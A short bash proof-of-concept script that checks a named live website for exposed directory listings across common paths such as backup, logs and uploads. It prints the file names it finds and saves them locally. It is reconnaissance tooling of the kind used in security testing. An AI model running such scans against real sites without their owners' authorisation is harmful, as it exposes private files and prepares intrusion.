#!/bin/bash
# Directory Listing Exposure PoC

echo "[*] Testing for directory listing vulnerabilities..."

# Test common directories for listing
dirs=(
    "images"
    "css"
    "js"
    "uploads"
    "files"
    "media"
    "downloads"
    "assets"
    "static"
    "public"
    "backup"
    "logs"
    "tmp"
    "temp"
    "cache"
    "includes"
    "inc"
    "lib"
    "vendor"
    "node_modules"
    "storage"
    "data"
    "export"
    "import"
)

for dir in "${dirs[@]}"; do
    url="https://stockity.com/$dir/"
    
    # Check if directory listing is enabled
    response=$(curl -s -L "$url")
    
    if echo "$response" | grep -q "<title>Index of /$dir"; then
        echo "[✓] DIRECTORY LISTING ENABLED: $url"
        echo "    Files found:"
        curl -s "$url" | grep -o '<a href="[^"]*">' | grep -v "/\">" | sed 's/<a href="//;s/">//' | head -10 | sed 's/^/        /'
        
        # Download file listing
        curl -s "$url" | grep -o '<a href="[^"]*">' | grep -v "/\">" | sed 's/<a href="//;s/">//' > "listing-$dir.txt"
        echo "    Full listing saved to listing-$dir.txt"
    elif echo "$response" | grep -q "403 Forbidden"; then
        echo "[ ] Access forbidden: $url"
    elif echo "$response" | grep -q "404 Not Found"; then
        echo "[ ] Not found: $url"
    else
        # Check if we get a 200 but not a listing
        status=$(curl -s -o /dev/null -w "%{http_code}" "$url")
        if [ "$status" == "200" ]; then
            echo "[?] Accessible but no listing: $url ($status)"
        fi
    fi
done
